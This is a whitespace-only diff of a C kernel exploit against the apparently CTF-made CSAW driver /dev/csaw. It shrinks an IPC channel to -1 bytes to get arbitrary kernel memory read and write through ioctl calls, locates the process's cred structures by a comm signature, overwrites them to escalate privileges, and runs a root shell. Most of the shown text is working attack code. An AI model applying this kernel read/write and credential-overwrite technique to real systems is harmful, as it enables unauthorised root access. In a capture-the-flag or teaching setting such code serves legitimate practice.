@@ -70,43 +70,43 @@ struct close_channel_args {
 
 void error ( char *msg )
 {
-	perror(msg);
-	exit(EXIT_FAILURE);
+    perror(msg);
+    exit(EXIT_FAILURE);
 }
 
 void hexdump ( char *addr, unsigned int length )
 {
-	unsigned int i, j;
+    unsigned int i, j;
 
-	for ( i = 0; i < length / 16; i++ )
-	{
-		for ( j = 0; j < 16; j++ )
-		{
-			printf("%02hhx ", addr[i * 16 + j]);
-		}
-		printf("\n");
-	}
+    for ( i = 0; i < length / 16; i++ )
+    {
+        for ( j = 0; j < 16; j++ )
+        {
+            printf("%02hhx ", addr[i * 16 + j]);
+        }
+        printf("\n");
+    }
 }
 
 int read_kernel_memory ( int fd, int id, unsigned long kaddr, void *buf, unsigned int size )
 {
     int ret;
-	struct seek_channel_args seek_channel;
-	struct read_channel_args read_channel;
+    struct seek_channel_args seek_channel;
+    struct read_channel_args read_channel;
 
-	memset(&seek_channel, 0, sizeof(seek_channel));
-	seek_channel.id = id;
-	seek_channel.index = kaddr - 0x10;
-	seek_channel.whence = SEEK_SET;
+    memset(&seek_channel, 0, sizeof(seek_channel));
+    seek_channel.id = id;
+    seek_channel.index = kaddr - 0x10;
+    seek_channel.whence = SEEK_SET;
 
-	ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);
+    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);
 
-	memset(&read_channel, 0, sizeof(read_channel));
-	read_channel.id = id;
-	read_channel.buf = buf;
-	read_channel.count = size;
+    memset(&read_channel, 0, sizeof(read_channel));
+    read_channel.id = id;
+    read_channel.buf = buf;
+    read_channel.count = size;
 
-	ret = ioctl(fd, CSAW_READ_CHANNEL, &read_channel);
+    ret = ioctl(fd, CSAW_READ_CHANNEL, &read_channel);
 
     return ret;
 }
@@ -115,8 +115,8 @@ int write_kernel_null_byte ( int fd, int id, unsigned long kaddr )
 {
     int ret;
     char null_byte = 0;
-	struct seek_channel_args seek_channel;
-	struct write_channel_args write_channel;
+    struct seek_channel_args seek_channel;
+    struct write_channel_args write_channel;
 
     /*
      * The write primitive uses strncpy_from_user(), so we can't write full
@@ -124,19 +124,19 @@ int write_kernel_null_byte ( int fd, int id, unsigned long kaddr )
      * zeroes anyhow, so this function just passes a single null byte.
      */
 
-	memset(&seek_channel, 0, sizeof(seek_channel));
-	seek_channel.id = id;
-	seek_channel.index = kaddr - 0x10;
-	seek_channel.whence = SEEK_SET;
+    memset(&seek_channel, 0, sizeof(seek_channel));
+    seek_channel.id = id;
+    seek_channel.index = kaddr - 0x10;
+    seek_channel.whence = SEEK_SET;
 
-	ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);
+    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);
 
-	memset(&write_channel, 0, sizeof(write_channel));
-	write_channel.id = id;
-	write_channel.buf = &null_byte;
-	write_channel.count = sizeof(null_byte);
+    memset(&write_channel, 0, sizeof(write_channel));
+    write_channel.id = id;
+    write_channel.buf = &null_byte;
+    write_channel.count = sizeof(null_byte);
 
-	ret = ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);
+    ret = ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);
 
     return ret;
 }
@@ -185,12 +185,12 @@ void gen_rand_str ( char *str, unsigned int len )
 
 int main ( int argc, char **argv )
 {
-	int ret, fd, id;
+    int ret, fd, id;
     unsigned long offset;
-	char *addr, *ceiling;
-	struct alloc_channel_args alloc_channel;
-	struct shrink_channel_args shrink_channel;
-	char comm[TASK_COMM_LEN];
+    char *addr, *ceiling;
+    struct alloc_channel_args alloc_channel;
+    struct shrink_channel_args shrink_channel;
+    char comm[TASK_COMM_LEN];
 
     /* Set comm to random signature */
 
@@ -206,40 +206,40 @@ int main ( int argc, char **argv )
 
     /* Open device */
 
-	fd = open("/dev/csaw", O_RDONLY);
-	if ( fd < 0 )
-		error("open");
+    fd = open("/dev/csaw", O_RDONLY);
+    if ( fd < 0 )
+        error("open");
 
     /* Allocate IPC channel */
 
-	memset(&alloc_channel, 0, sizeof(alloc_channel));
-	alloc_channel.buf_size = 1;
+    memset(&alloc_channel, 0, sizeof(alloc_channel));
+    alloc_channel.buf_size = 1;
 
-	ret = ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
-	if ( ret < 0 )
-		error("ioctl");
+    ret = ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
+    if ( ret < 0 )
+        error("ioctl");
 
     id = alloc_channel.id;
 
-	printf("Allocated channel id %d\n", id);
+    printf("Allocated channel id %d\n", id);
 
     /* Shrink channel to -1 */
 
-	memset(&shrink_channel, 0, sizeof(shrink_channel));
-	shrink_channel.id = id;
-	shrink_channel.size = 2;
+    memset(&shrink_channel, 0, sizeof(shrink_channel));
+    shrink_channel.id = id;
+    shrink_channel.size = 2;
 
-	ret = ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);
-	if ( ret < 0 )
-		error("ioctl");
+    ret = ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);
+    if ( ret < 0 )
+        error("ioctl");
 
-	printf("Shrank channel to -1 bytes\n");
+    printf("Shrank channel to -1 bytes\n");
 
     /* Map buffer for leaking kernel memory to */
 
-	addr = (char *)mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
-	if ( addr == MAP_FAILED )
-		error("mmap");
+    addr = (char *)mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
+    if ( addr == MAP_FAILED )
+        error("mmap");
 
     ceiling = addr + BUF_SIZE;
 
@@ -306,8 +306,8 @@ int main ( int argc, char **argv )
                 cred = search[-1];
 
                 printf("Found comm signature at %p\n", (void *)(kernel_addr + ((char *)search - addr)));
-	            printf("read_cred = %p\n", (void *)real_cred);
-            	printf("cred = %p\n", (void *)cred);
+                printf("read_cred = %p\n", (void *)real_cred);
+                printf("cred = %p\n", (void *)cred);
 
                 escalate_creds(fd, id, real_cred);
 
@@ -334,5 +334,5 @@ GOT_ROOT:
 
     execl("/bin/sh", "sh", NULL);
 
-	return 0;
+    return 0;
 }
